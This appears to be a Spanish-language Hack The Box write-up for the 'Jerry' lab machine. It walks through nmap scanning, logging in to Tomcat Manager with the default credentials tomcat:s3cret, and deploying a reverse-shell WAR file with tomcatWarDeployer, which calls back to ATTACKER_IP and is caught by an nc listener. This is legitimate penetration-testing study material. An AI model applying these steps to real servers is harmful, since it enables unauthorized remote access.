---
title: "Jerry"
date: "2025-03-27T00:04:43-05:00"
type: "maquinas"
draft: false
tags: ["Tomcat", "WAR-File", "Windows"]
---

## Descripción: 
Maquina bastante sencilla que nos pide utilizar unas credenciales predeterminadas para explotar la carga y ejecucion de archivos war en tomcat


# Enumeración

Lo primero que vamos a hacer en esta maquina después de conectarnos a la VPN es mandar los siguientes dos comandos de nmap con el fin de identificar los puertos abiertos y los servicios junto con sus versiones de estos puertos:

```bash
sudo nmap -p- --open --min-rate 5000 -sS -Pn -n 10.129.8.202 -oG allPorts
#El segundo comando se envia especificando los puertos que el primero nos mostro abiertos
#En este caso solo nos mostro el puerto 8080
nmap -p8080 -sVC -A {IP} -oN target
```

Con el primer comando vamos a hacer un escaneo rápido principalmente porque con el segundo será mas exhaustivo lo que hace el primer comando es:

- **sudo nmap -p- --open --min-rate 5000 -sS -Pn -n 10.129.8.202 -oG allPorts**
    - -p-: Escanea todos los puertos (1-65535).
    - --open: Solo muestra los puertos abiertos.
    - --min-rate 5000: Establece una tasa mínima de paquetes por segundo.
    - -sS: Realiza un escaneo SYN "sigiloso".
    - -Pn: No hace ping (asume que el host está activo).
    - -n: No realiza resolución DNS.
    - -oG allPorts: Guarda la salida en formato grepeable en el archivo allPorts.

Mientras que el segundo escaneo hace esto:

- **nmap -p8080 -sVC -A {IP} -oN target**
    - -p8080: Escanea específicamente el puerto 8080.
    - -sVC: Combina las opciones -sV (detección de versión) y -sC (scripts por defecto).
    - -A: Habilita la detección de OS, versiones, scripts y traceroute.
    - -oN target: Guarda la salida en formato normal en el archivo target.

Despues de ejecutar estos dos podremos ver la siguiente salida:

<a href="https://imgur.com/q3Wy9xj"><img src="https://i.imgur.com/q3Wy9xj.png" title="source: imgur.com" /></a>

Lo único que podemos ver con esto es que en el puerto `8080` esta corriendo un servicio `http` que esta usando `Apache Tomcat` .

## Puerto 8080

<a href="https://imgur.com/MITl8Mb"><img src="https://i.imgur.com/MITl8Mb.png" title="source: imgur.com" /></a>

Al ingresar a la pagina especificando en el navegador la IP y el puerto veremos esta pagina muy sencilla, si buscamos un poco lo único interesante que tendremos es el “Manager App” que nos pide usuario y contraseña, haciendo una rápida búsqueda de credenciales predeterminadas de apache encontramos varias probando nos daremos cuenta que funcionan `tomcat:s3cret` por lo que tendremos acceso a “Manager App”:

<a href="https://imgur.com/SOURtGO"><img src="https://i.imgur.com/SOURtGO.png" title="source: imgur.com" /></a>

Si leemos un poco lo que dice nos podremos dar cuenta que podemos subir y desplegar archivos `WAR` en la pagina.

# Explotación

Si buscamos como explotar un archivo WAR en Tomcat podremos hallar la siguiente pagina la cual nos explica como crear un archivo con una Shell reversa que podremos usar para conectarnos a la maquina [Hack Tricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat/index.html?highlight=war#msfvenom-reverse-shell).

Vamos a hacer el paso a paso para poder acceder a la maquina:

```bash
#Crear el archivo infectado
git clone https://github.com/mgeeky/tomcatWarDeployer.git
cd tomcatWarDeployer
python3 tomcatWarDeployer.py -U <username> -P <password> -H <ATTACKER_IP> -p <ATTACKER_PORT> <VICTIM_IP>:<VICTIM_PORT>/manager/html/

#Ponernos en escucha por el puerto 4444
nc -lvnp 4444
```

Después de ejecutar estos comandos vamos a entrar a la pagina y subir el archivo para posteriormente oprimir el botón `Deploy` .

Una vez hagamos esto nos debería aparecer algo parecido a lo siguiente:

<a href="https://imgur.com/4B8mc7L"><img src="https://i.imgur.com/4B8mc7L.png" title="source: imgur.com" /></a>

Vamos a darle al botón `Reload` de la aplicación `revshell` con esto habremos ingresado a la maquina ya para obtener las dos flags para Hack The Box nos dirigiremos a:

`C:\Users\Administrator\Desktop\flags`